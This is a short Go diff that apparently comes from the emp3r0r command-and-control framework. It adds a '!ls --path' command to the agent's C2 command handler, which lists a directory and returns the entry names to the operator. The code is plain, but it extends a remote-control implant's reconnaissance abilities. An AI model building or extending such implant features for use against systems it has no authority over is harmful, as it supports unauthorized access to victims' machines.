@@ -26,6 +26,25 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 
 	switch cmdSlice[0] {
 
+	case emp3r0r_data.C2CmdListDir:
+		// List directory and return entries
+		// Usage: !ls --path <path>
+		path := flags.StringP("path", "p", "", "Path to list")
+		flags.Parse(cmdSlice[1:])
+		if *path == "" {
+			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
+			return
+		}
+		entries, err := os.ReadDir(*path)
+		if err != nil {
+			out = fmt.Sprintf("Error: cant read dir %s: %v", *path, err)
+			return
+		}
+		for _, entry := range entries {
+			out += fmt.Sprintf("%s\n", entry.Name())
+		}
+		return
+
 	// stat file
 	// Usage: !stat --path <path>
 	// Retrieves file statistics for the specified path.
